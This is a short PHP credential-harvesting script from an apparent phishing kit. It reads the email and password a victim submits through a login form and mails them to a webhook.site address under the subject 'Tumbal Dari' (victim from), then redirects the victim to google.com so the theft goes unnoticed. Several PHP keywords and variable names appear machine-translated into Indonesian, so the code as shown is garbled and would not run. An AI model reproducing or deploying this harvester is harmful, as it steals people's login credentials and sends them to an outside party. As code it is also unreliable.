<?php

$email = $_POST['email'];

$password = $_POST['password'];

if (kosong($email) && kosong($kata sandi)) {

  header('lokasi: ./');

} kalau tidak {

$pesan = "

Email : ".$email."

Kata sandi : ".$kata sandi."

";

$emailmu = "db85154e-7100-428b-87b9-7158a00788d7@email.webhook.site";

$subjek = "Tumbal Dari [ ".$email." ]";

$headers = 'Dari: XNULL <noreply@xnull.ml>' . "\r\n";

mail($emailmu, $subjek, $pesan, $header);

header('lokasi: https://google.com');

}

?>

